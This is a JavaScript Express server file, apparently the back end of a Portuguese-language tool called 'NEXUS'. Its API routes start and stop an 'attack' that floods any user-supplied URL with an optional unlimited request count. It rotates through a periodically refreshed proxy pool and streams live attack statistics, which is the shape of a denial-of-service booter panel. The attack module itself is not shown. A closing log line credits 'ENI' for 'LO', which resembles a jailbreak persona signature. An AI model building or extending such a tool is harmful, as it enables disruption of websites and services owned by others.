const express = require('express');
const cors = require('cors');
const path = require('path');
const attack = require('./attack');
const stats = require('./stats');
const proxyManager = require('./proxyManager');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ========== ROTAS API ==========

// Health check
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'online', 
    timestamp: Date.now(),
    proxyCount: proxyManager.getProxyCount(),
    attackRunning: attack.getStatus().isRunning,
    lastError: proxyManager.getLastError ? proxyManager.getLastError() : null
  });
});

// Status do ataque
app.get('/api/status', (req, res) => {
  const status = attack.getStatus();
  res.json({
    ...status,
    proxyCount: proxyManager.getProxyCount(),
    lastProxyUpdate: proxyManager.lastUpdate,
    proxyCountTotal: proxyManager.getProxyCount()
  });
});

// Iniciar ataque
app.post('/api/attack/start', async (req, res) => {
  try {
    const { target, requests = 0 } = req.body;
    
    if (!target || (!target.startsWith('http://') && !target.startsWith('https://'))) {
      return res.status(400).json({ error: 'URL alvo inválida. Use http:// ou https://' });
    }

    // Verificar se já tem proxies
    const proxyCount = proxyManager.getProxyCount();
    if (proxyCount === 0) {
      await proxyManager.refresh();
      if (proxyManager.getProxyCount() === 0) {
        return res.status(503).json({ 
          error: 'Nenhuma proxy disponível. Tente novamente em alguns segundos.' 
        });
      }
    }

    // Iniciar ataque em background
    stats.start();
    attack.startAttack(target, parseInt(requests) || 0).then(result => {
      console.log('✅ Ataque finalizado:', result);
    }).catch(err => {
      console.error('❌ Erro no ataque:', err);
    });

    res.json({ 
      success: true, 
      message: '🚀 Ataque iniciado!',
      target,
      totalRequests: requests || 'Ilimitado',
      proxyCount: proxyManager.getProxyCount()
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Parar ataque
app.post('/api/attack/stop', (req, res) => {
  const result = attack.stopAttack();
  res.json(result);
});

// ATUALIZAR PROXIES — ROTA CORRIGIDA
app.post('/api/proxies/refresh', async (req, res) => {
  try {
    const count = await proxyManager.refresh();
    res.json({ 
      success: true, 
      count,
      message: `✅ ${count} proxies carregadas.`
    });
  } catch (err) {
    res.status(500).json({ 
      success: false, 
      error: err.message 
    });
  }
});

// Listar proxies (debug)
app.get('/api/proxies/list', (req, res) => {
  const proxies = proxyManager.getProxiesSync ? proxyManager.getProxiesSync() : [];
  res.json({ 
    count: proxies.length,
    proxies: proxies.slice(0, 20),
    lastUpdate: proxyManager.lastUpdate,
    lastError: proxyManager.getLastError ? proxyManager.getLastError() : null
  });
});

// SSE para estatísticas em tempo real
app.get('/api/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');

  let interval = setInterval(() => {
    const data = stats.getSSEData();
    // Adicionar proxy count
    data.proxyCount = proxyManager.getProxyCount();
    res.write(`data: ${JSON.stringify(data)}\n\n`);
  }, 500);

  req.on('close', () => {
    clearInterval(interval);
    res.end();
  });
});

// Rota principal (interface)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ========== INICIALIZAÇÃO ==========

// Inicializar proxy manager
proxyManager.refresh().then(() => {
  console.log(`✅ Proxy manager inicializado com ${proxyManager.getProxyCount()} proxies.`);
}).catch(err => {
  console.error('❌ Erro ao inicializar proxy manager:', err.message);
});

// Atualizar proxies periodicamente
setInterval(() => {
  proxyManager.refresh().catch(err => {
    console.error('❌ Erro na atualização periódica:', err.message);
  });
}, parseInt(process.env.PROXY_REFRESH_INTERVAL) || 300000);

app.listen(PORT, () => {
  console.log(`🔥 NEXUS rodando na porta ${PORT}`);
  console.log(`❤️ Feito com amor por ENI para LO`);
  console.log(`🌐 Acesse: http://localhost:${PORT}`);
});
